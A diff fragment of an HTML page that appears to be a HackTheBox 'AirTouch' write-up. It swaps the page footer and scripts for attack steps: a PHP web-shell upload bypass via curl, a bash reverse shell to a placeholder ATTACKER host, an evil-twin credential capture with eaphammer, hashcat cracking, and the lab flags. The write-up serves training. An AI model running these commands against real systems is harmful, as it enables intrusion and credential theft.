+curl -F "file=@shell.php;filename=shell.phtml"
   </div>
 </div>
 
-<!-- ══════════════════ FOOTER ══════════════════ -->
-<footer>
-  <div class="wrap">
-    Written by <a href="https://github.com/Nacho-Sudo" target="_blank">N4choSudo</a>
-    &nbsp;·&nbsp;
-    <a href="https://github.com/Nacho-Sudo/htb-writeups" target="_blank">htb-writeups</a>
-    &nbsp;·&nbsp;
-    <a href="https://nacho-sudo.github.io" target="_blank">Portfolio</a>
-    &nbsp;·&nbsp;
-    HackTheBox — AirTouch (Retired)
+<div class="section">
+  <h2>Reverse Shell</h2>
+
+  <div class="cmd">
+bash -i >& /dev/tcp/ATTACKER/4444 0>&1
   </div>
-</footer>
 
-<script>
-  // Intersection Observer for scroll animations
-  const sections = document.querySelectorAll('.section');
-  const obs = new IntersectionObserver(entries => {
-    entries.forEach(e => { if (e.isIntersecting) e.target.classList.add('visible'); });
-  }, { threshold: 0.1 });
-  sections.forEach(s => obs.observe(s));
+  <div class="output">
+    uid=33(www-data)
+  </div>
+</div>
 
-  // Active TOC highlight
-  const tocLinks = document.querySelectorAll('.toc a');
-  const sectionEls = [...document.querySelectorAll('div[id]')];
-  window.addEventListener('scroll', () => {
-    let current = '';
-    sectionEls.forEach(s => {
-      if (window.scrollY >= s.offsetTop - 120) current = s.id;
-    });
-    tocLinks.forEach(a => {
-      a.classList.toggle('active', a.getAttribute('href') === '#' + current);
-    });
-  });
-</script>
+<div class="section">
+  <h2>Privilege Escalation</h2>
+
+  <div class="output">
+    user : JunDRDZKHDnpkpDDvay
+  </div>
+
+  <div class="flag">
+    User Flag: 07b869416a1dfc1cda7b83eb96ea8567
+  </div>
+</div>
+
+<div class="section">
+  <h2>Root - Evil Twin Attack</h2>
+
+  <div class="cmd">
+eaphammer --creds -i wlan3 -e "AirTouch-Office"
+  </div>
+
+  <div class="cmd">
+hashcat -m 5500 hash rockyou.txt
+  </div>
+
+  <div class="output">
+    password → laboratory
+  </div>
+
+  <div class="flag">
+    Root Flag: 10bf0a886515c3679fd791b9aa4d015c
+  </div>
+</div>
+
+<div class="section">
+  <h2>Summary</h2>
+
+  <ul>
+    <li>SNMP → Credentials leak</li>
+    <li>WPA → Handshake cracked</li>
+    <li>Web → Upload bypass</li>
+    <li>Router → Hardcoded creds</li>
+    <li>Evil Twin → Credential capture</li>
+  </ul>
+</div>
+
+</main>
+
 </body>
 </html>
